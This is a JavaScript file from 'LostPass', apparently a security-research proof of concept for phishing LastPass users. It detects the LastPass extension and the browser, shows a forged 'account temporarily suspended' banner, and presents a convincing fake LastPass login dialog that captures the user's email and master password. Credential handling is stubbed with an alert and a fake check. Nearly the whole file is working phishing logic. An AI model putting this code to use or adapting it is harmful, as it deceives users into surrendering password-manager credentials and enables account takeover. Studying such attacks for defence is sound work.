var chromeHTML = <%= assets.chrome.html %>; 
var chromeCSS = <%= assets.chrome.css %>; 

var firefoxHTML = <%= assets.firefox.html %>;
var firefoxCSS = <%= assets.firefox.css %>;

var firefoxLoginOSXHTML = <%= assets.firefox_login.html.osx %>;
var firefoxLoginWinHTML = <%= assets.firefox_login.html.win %>;
var firefoxLoginCSS = <%= assets.firefox_login.css %>;

var lpDetectFormHTML = 
'<form id="lpdetectform" action="" style="visibility:hidden; position:absolute">'+
'<label for="lpdetectusername">Username:</label>'+
'<input id="lpdetectusername" type="text" name="username">'+
'<label for="lpdetectpassword">Password:</label>'+
'<input id="lpdetectpassword" type="password" name="lpdetectpassword">'+
'<input type="submit" value="Login">'+
'</form>';

var messageMarker = "XX_MESSAGE_XX";
var buttonMarker = "XX_BUTTON_XX";

var defaultMessage = "Your account has been temporarily suspended (for 5 minutes) because of too many login attempt failures."
var defaultButton = "Recover Account";

var retryMessage = "Invalid password.";
var retryButton = "Try Again";

function lastPassIsInstalled() {
    var username = document.getElementById("lpdetectusername");
    var style = username.getAttribute("style");
    return (style != null && style.indexOf("background-image") > -1);
}

function detectBrowser() {
    var ua= navigator.userAgent, tem,
    M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
        if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
    }
    M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);

    var result = M.join(' ');
    return result;
}

function skipBanner() {
    return window.location.href.indexOf("?y") > -1;
}

function invalidPassword() {
    return window.location.href.indexOf("?n") > -1;
}

function lpInit() {
    document.body.insertAdjacentHTML('beforeend', lpDetectFormHTML);

    window.setTimeout(function() {
        if (lastPassIsInstalled() && !skipBanner()) {
            // Logout the user if they're logged in TODO
            //var logoutScript = document.createElement('script');
            //logoutScript.setAttribute('src', "https://lastpass.com/logout.php");
            //document.body.appendChild(logoutScript);

            var browser = detectBrowser();

            console.log("LostPass: detected ", browser);
            if (browser.startsWith("Chrome")) {
                // Add the style tag to <head>
                var style = document.createElement('style');
                style.innerHTML = chromeCSS;
                document.head.appendChild(style);

                // Add the banner
                var finalHtml;
                if (invalidPassword()) {
                    finalHtml = chromeHTML.replace(messageMarker, retryMessage).replace(buttonMarker, retryButton);
                } else {
                    finalHtml = chromeHTML.replace(messageMarker, defaultMessage).replace(buttonMarker, defaultButton);
                }
                document.body.insertAdjacentHTML('afterbegin', finalHtml);

                // Make the "X" close the banner
                var x = document.getElementById("lphideoverlay");
                x.onclick = function() {
                    var banner = document.getElementById("lastpass-notification");
                    banner.setAttribute("style","visibility:hidden");
                };
            } else if (browser.startsWith("Firefox")) {
                var style = document.createElement('style');
                style.innerHTML = firefoxCSS;
                document.head.appendChild(style);

                ffShowBanner();
            } else {
                console.log("LostPass: unknown browser ", browser);
            }
        } else {
            console.log("LostPass: LastPass is not installed");
        }
    }, 500);
}

function ffShowBanner() {
    // Add the banner
    document.body.insertAdjacentHTML('afterbegin', firefoxHTML);

    // Make the "X" close the banner
    var x = document.getElementById("lphideoverlay");
    x.onclick = ffHideBanner;
}

function ffHideBanner() {
    var banner = document.getElementById("lastpass-notification");
    banner.parentNode.removeChild(banner);
}

function ffOnClick() {
    ffHideBanner();

    // Add the login form style
    var style = document.createElement('style');
    style.innerHTML = firefoxLoginCSS;
    document.head.appendChild(style);

    // Add the login form
    var closefunc = function() {
        // Need to hide after the animation otherwise it will reappear
        login.addEventListener("animationend", function() {
            login.style.visibility = "hidden";
        }, false);

        if (animate === "Windows") {
            console.log("Windows fadeout");
            login.style.animationName = "fadeout";
        } else {
            login.style.animationName = "slideout";
        }
    };
    var animate;
    if (navigator.appVersion.indexOf("Win") != -1) {
        console.log("Detected Windows");
        document.body.insertAdjacentHTML('afterbegin', firefoxLoginWinHTML);
        var login = document.getElementById("lpfirefoxlogin");
        var closers = document.getElementsByClassName("lpclose");
        console.log("Closers ", closers);
        for(var i = 0; i < closers.length; i++) {
            var closer = closers[i];
            closer.onclick = closefunc;
        }
        interact('div.spacer')
            .draggable({
                autoScroll:false,
                onmove: function (event) {
                    // keep the dragged position in the data-x/data-y attributes
                    var target = login;
                    var x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
                    var y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;

                    // translate the element
                    target.style.webkitTransform =
                    target.style.transform =
                    'translate(' + x + 'px, ' + y + 'px)';

                    // update the posiion attributes
                    target.setAttribute('data-x', x);
                    target.setAttribute('data-y', y);
                }
            });
        animate = "Windows";
    } else {
        console.log("Detected Other");
        document.body.insertAdjacentHTML('afterbegin', firefoxLoginOSXHTML);
        var login = document.getElementById("lpfirefoxlogin");
         
        // Make close work
        var close = document.getElementById("lpcancel");
        close.onclick = closefunc;

        animate = "Other";
    }

    // Make remember email work
    var rememberemail = document.getElementById("rememberemail");
    rememberemail.onclick = function() {
        var rememberPasswordCheckbox = document.getElementById("rememberpassword");
        rememberPasswordCheckbox.disabled = !rememberemail.checked;
    };

    
    // Make login work
    var submit = document.getElementById("lpsubmit");
    var emailfield = document.getElementById("lpemail");
    var pwfield = document.getElementById("lppassword");
    submit.onclick = function() {
        var login = document.getElementById("lpfirefoxlogin");

        // Need to hide after the animation otherwise it will reappear
        login.addEventListener("animationend", function() {
            login.parentNode.removeChild(login);
        }, false);

        if (animate === "Windows") {
            console.log("Windows fadeout");
            login.style.animationName = "fadeout";
        } else {
            login.style.animationName = "slideout";
        }

        var username = emailfield.value;
        var password = pwfield.value;
        if (tryLogin(username, password)) {
            alert("Got " + username + " and " + password);
        } else {
            ffShowBanner();
        }
    };

    // Fight LastPass to remove the asterisks
    var config = { attributes: true };
    var observer = new MutationObserver(function(mutations) {
        // If we don't disconnect first, this causes an infinite loop
        observer.disconnect();

        emailfield.style = "";
        pwfield.style = "";
        
        // Reconnect
        observer.observe(emailfield, config);
        observer.observe(pwfield, config);
    });
    observer.observe(emailfield, config);
    observer.observe(pwfield, config);
}

function tryLogin(username, password) {
    // This is obviously a fake function
    return password === "correct";
}
